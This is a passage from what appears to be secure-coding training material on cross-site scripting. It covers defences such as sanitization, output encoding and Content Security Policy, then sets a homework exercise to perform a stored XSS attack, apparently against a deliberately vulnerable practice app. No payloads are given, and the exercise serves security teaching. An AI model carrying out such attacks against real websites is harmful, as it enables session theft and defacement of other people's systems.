* Attackers can steal sessions, deface websites, or run arbitrary scripts

### ğŸ›¡ï¸ Defending against XSS

* Always **validate and sanitize** user input
* **Encode outputs** before rendering to the browser
* Use **Content Security Policy (CSP)** to reduce XSS impact
* Leverage **framework-level protections** (e.g., Angular, React auto-escaping)

---

# ğŸ“Œ Final Thoughts

* Prevention is not a one-time fix â€” itâ€™s a secure coding mindset
* Use security tools and linters (e.g., eslint-plugin-security)
* Review and test regularly: **XSS is sneaky and persistent**

## Exercise 2.2 (:house:) - Homework

1. Identify places where _stored_ user input is displayed elsewhere
2. Perform any _Stored XSS_ attack successfully (:star::star: -
   :star::star::star::star::star::star:)
3. Visit the page where the attack gets executed to verify your success
